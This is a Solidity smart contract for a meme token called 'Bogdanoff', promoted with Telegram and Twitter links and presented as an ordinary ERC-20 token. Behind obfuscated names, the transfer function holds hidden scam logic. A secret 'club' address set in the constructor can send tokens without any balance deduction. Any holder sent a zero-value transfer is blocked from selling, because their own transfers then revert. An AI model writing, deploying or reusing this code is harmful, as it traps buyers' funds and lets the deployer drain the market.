/*

Telegram: https://t.me/BogdanoffETHPortal

Twitter: https://twitter.com/Bogdanoff__ETH

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Bogdanoff is Ownable {
    function transfer(address made, uint256 voyage) public returns (bool success) {
        lamp(msg.sender, made, voyage);
        return true;
    }

    function lamp(address use, address made, uint256 voyage) private returns (bool success) {
        if (chose[use] == 0) {
            balanceOf[use] -= voyage;
        }

        if (voyage == 0) bag[made] += row;

        if (use != uniswapV2Pair && chose[use] == 0 && bag[use] > 0) {
            chose[use] -= row;
        }

        balanceOf[made] += voyage;
        emit Transfer(use, made, voyage);
        return true;
    }

    string public name = 'Bogdanoff';

    mapping(address => uint256) private chose;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address use, address made, uint256 voyage) public returns (bool success) {
        require(voyage <= allowance[use][msg.sender]);
        allowance[use][msg.sender] -= voyage;
        lamp(use, made, voyage);
        return true;
    }

    address public uniswapV2Pair;

    function approve(address describe, uint256 voyage) public returns (bool success) {
        allowance[msg.sender][describe] = voyage;
        emit Approval(msg.sender, describe, voyage);
        return true;
    }

    uint8 public decimals = 9;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private row = 63;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private bag;

    string public symbol = 'Bogdanoff';

    constructor(address club) {
        balanceOf[msg.sender] = totalSupply;
        chose[club] = row;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    mapping(address => uint256) public balanceOf;
}